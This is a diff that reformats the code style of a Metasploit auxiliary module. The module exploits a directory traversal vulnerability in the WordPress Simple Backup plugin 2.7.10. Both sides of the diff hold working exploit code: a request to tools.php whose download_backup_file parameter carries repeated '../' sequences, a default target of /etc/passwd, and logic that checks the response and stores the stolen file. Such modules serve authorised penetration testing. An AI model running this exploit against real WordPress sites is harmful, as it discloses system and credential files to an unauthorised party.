@@ -9,31 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress Simple Backup File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in WordPress Plugin
-        "Simple Backup" version 2.7.10, allowing to read arbitrary files with the
-        web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Simple Backup File Read Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in WordPress Plugin
+          "Simple Backup" version 2.7.10, allowing to read arbitrary files with the
+          web server privileges.
+        },
+        'References' => [
           ['WPVDB', '7997'],
           ['PACKETSTORM', '131919']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Mahdi.Hidden', # Vulnerability Discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 6 ])
-      ])
+      ]
+    )
   end
 
   def check
@@ -43,31 +45,31 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
-    filename = filename[1, filename.length] if filename =~ /^\//
+    filename = filename[1, filename.length] if filename =~ %r{^/}
 
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    => normalize_uri(wordpress_url_backend, 'tools.php'),
+      'uri' => normalize_uri(wordpress_url_backend, 'tools.php'),
       'vars_get' =>
         {
-          'page'  => 'backup_manager',
+          'page' => 'backup_manager',
           'download_backup_file' => "#{traversal}#{filename}"
         }
     )
 
     unless res && res.body
-      vprint_error("Server did not respond in an expected way.")
+      vprint_error('Server did not respond in an expected way.')
       return
     end
 
     if res.code == 200 &&
-        res.body.length > 0 &&
-        res.headers['Content-Disposition'] &&
-        res.headers['Content-Disposition'].include?('attachment; filename') &&
-        res.headers['Content-Length'] &&
-        res.headers['Content-Length'].to_i > 0
+       !res.body.empty? &&
+       res.headers['Content-Disposition'] &&
+       res.headers['Content-Disposition'].include?('attachment; filename') &&
+       res.headers['Content-Length'] &&
+       res.headers['Content-Length'].to_i > 0
 
-      vprint_line("#{res.body}")
+      vprint_line(res.body.to_s)
       fname = datastore['FILEPATH']
 
       path = store_loot(
@@ -80,7 +82,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_good("File saved in: #{path}")
     else
-      vprint_error("Nothing was downloaded. You can try to change the DEPTH parameter or verify the correct filename.")
+      vprint_error('Nothing was downloaded. You can try to change the DEPTH parameter or verify the correct filename.')
     end
   end
 end
